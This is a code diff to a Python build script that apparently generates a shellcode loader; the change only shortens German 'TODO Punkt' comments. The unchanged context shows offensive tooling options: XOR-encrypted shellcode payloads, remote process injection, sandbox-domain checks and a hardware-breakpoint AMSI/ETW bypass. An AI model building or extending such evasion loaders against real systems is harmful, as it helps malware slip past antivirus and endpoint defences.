@@ -47,15 +47,15 @@ if __name__ == "__main__":
     parser.add_argument("mode", action="store", help=f"Mode of execution. Valid choices are: {', '.join(supported_modes)}")
     parser.add_argument("source_file", action="store", nargs="?", help="Source file name [PE or Shellcode]")
     # +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ #
-    # TODO Punkt 2                                                                                              #
+    # TODO 2                                                                                                    #
     # +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ #
     parser.add_argument("--shellcode-file", action="store_true", default=False, dest="shellcode_file", help="Read payload from file instead of embedding")
     # +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ #
-    # TODO Punkt 4                                                                                              #
+    # TODO 4                                                                                                    #
     # +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ #
     parser.add_argument("--remote-inject", action="store_true", default=False, dest="remote_inject", help="Use remote injection")
     # +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ #
-    # TODO Punkt 7                                                                                              #
+    # TODO 7                                                                                                    #
     # +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ #
     parser.add_argument("--hwbp-amsi-etw", action="store_true", default=False)
 
@@ -107,7 +107,7 @@ if __name__ == "__main__":
     shellcode = xor_with_key(shellcode, encKey)
 
     # +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ #
-    # TODO Punkt 2                                                                                              #
+    # TODO 2                                                                                                    #
     # +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ #
     if args.shellcode_file:
         with open("payload.bin", "wb") as f:
@@ -118,7 +118,7 @@ if __name__ == "__main__":
     with open("src/defines.h", "w+") as f:
         f.write(f"#define ENCRYPTION_KEY \"{encKey}\"\n")
         # +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ #
-        # TODO Punkt 2                                                                                              #
+        # TODO 2                                                                                                    #
         # +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ #
         if not args.shellcode_file:
             f.write(f"#define SHELLCODE_LEN {shellcode_size}\n")
@@ -135,15 +135,15 @@ if __name__ == "__main__":
         if args.domain:      f.write("#define SANDBOX_DOMAIN\n")
 
         # +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ #
-        # TODO Punkt 2                                                                                              #
+        # TODO 2                                                                                                    #
         # +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ #
         if args.shellcode_file: f.write("#define SHELLCODE_FILE\n")
         # +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ #
-        # TODO Punkt 4                                                                                              #
+        # TODO 4                                                                                                    #
         # +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ #
         if args.remote_inject:  f.write("#define REMOTE_INJECT\n")
         # +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ #
-        # TODO Punkt 7                                                                                              #
+        # TODO 7                                                                                                    #
         # +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ #
         if args.hwbp_amsi_etw:  f.write("#define HWBP_AMSI_ETW\n")
 
